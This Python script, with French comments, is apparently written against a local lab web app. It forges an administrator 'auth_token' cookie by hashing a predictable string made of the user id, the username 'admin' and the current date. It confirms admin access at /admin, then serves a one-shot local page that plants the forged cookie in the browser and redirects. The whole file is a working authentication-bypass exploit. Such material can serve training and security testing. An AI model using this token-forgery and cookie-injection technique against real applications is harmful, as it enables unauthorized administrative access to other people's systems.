import requests
import hashlib
from datetime import datetime
import webbrowser
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

TARGET_ID       = 3
TARGET_USERNAME = "admin"
BASE_URL        = "http://localhost:5000"
INJECTOR_PORT   = 8765

now = datetime.now()
date_str = now.strftime("%Y-%m-%d")
uid_hex = format(TARGET_ID, 'x')
raw = f"{uid_hex}|{TARGET_USERNAME}|{date_str}"
admin_token = hashlib.sha256(raw.encode()).hexdigest()
print(f"[*] Token calculé : {admin_token}")

# 1. Vérification via requests
session = requests.Session()
session.cookies.set("auth_token", admin_token)
response = session.get(f"{BASE_URL}/admin")

if response.status_code != 200 or "Administration" not in response.text:
    print(f"[-] Échec côté serveur (HTTP {response.status_code})")
    exit(1)

print("[+] SUCCÈS ! Accès administrateur confirmé côté serveur.")
print(f"[+] Token utilisé : {admin_token}")

# 2. Mini serveur qui set le cookie et redirige vers /admin
html = f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Injection...</title></head>
<body>
<script>
  document.cookie = "auth_token={admin_token}; path=/; SameSite=Lax";
  window.location.href = "{BASE_URL}/forum";
</script>
<p>Redirection en cours...</p>
</body>
</html>"""

class InjectorHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())

    def log_message(self, format, *args):
        pass  # Silencer les logs du serveur

server = HTTPServer(("localhost", INJECTOR_PORT), InjectorHandler)

# Arrêter le serveur après la première requête
def serve_once():
    server.handle_request()
    server.server_close()

thread = threading.Thread(target=serve_once)
thread.daemon = True
thread.start()

print(f"[*] Serveur d'injection démarré sur le port {INJECTOR_PORT}...")
print("[*] Ouverture du navigateur...")
webbrowser.open(f"http://localhost:{INJECTOR_PORT}")

thread.join(timeout=10)
print("[*] Terminé.")